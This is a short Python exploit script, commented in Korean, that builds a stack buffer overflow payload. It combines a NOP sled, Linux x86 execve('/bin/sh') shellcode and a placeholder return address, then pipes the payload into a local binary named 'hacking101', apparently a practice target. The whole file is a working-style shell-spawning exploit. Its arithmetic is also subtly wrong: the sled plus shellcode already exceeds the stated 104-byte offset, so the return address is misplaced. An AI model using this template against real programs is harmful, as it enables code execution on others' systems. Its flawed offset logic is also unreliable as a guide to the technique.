import sys
import subprocess

# NOP sled
nop_sled = b"\x90" * 100

# 셸코드 (리눅스 x86의 execve 셸코드 예제)
shellcode = (
    b"\x31\xc0"          # xor eax, eax
    b"\x50"              # push eax
    b"\x68\x2f\x2f\x73\x68"  # push //sh
    b"\x68\x2f\x62\x69\x6e"  # push /bin
    b"\x89\xe3"          # mov ebx, esp
    b"\x50"              # push eax
    b"\x53"              # push ebx
    b"\x89\xe1"          # mov ecx, esp
    b"\x99"              # cdq
    b"\xb0\x0b"          # mov al, 0x0b
    b"\xcd\x80"          # int 0x80
)

# 스택 프레임 오프셋과 리턴 주소
buffer_size = 100
offset = 104  # 100 bytes of buf + 4 bytes for saved EBP

# 리턴 주소: 셸코드로 이동할 주소 (예시 주소)
return_address = b"\xef\xbe\xad\xde"  # 예시 주소, 실제 환경에 맞는 주소로 수정해야 함

payload = nop_sled + shellcode
payload = payload.ljust(offset, b"A") + return_address

# 페이로드를 파일로 저장하고 이를 프로그램 입력으로 사용
with open("payload.txt", "wb") as f:
    f.write(payload)

# 파일로부터 페이로드를 읽어 stdin으로 전달
subprocess.run(["./hacking101"], input=payload)
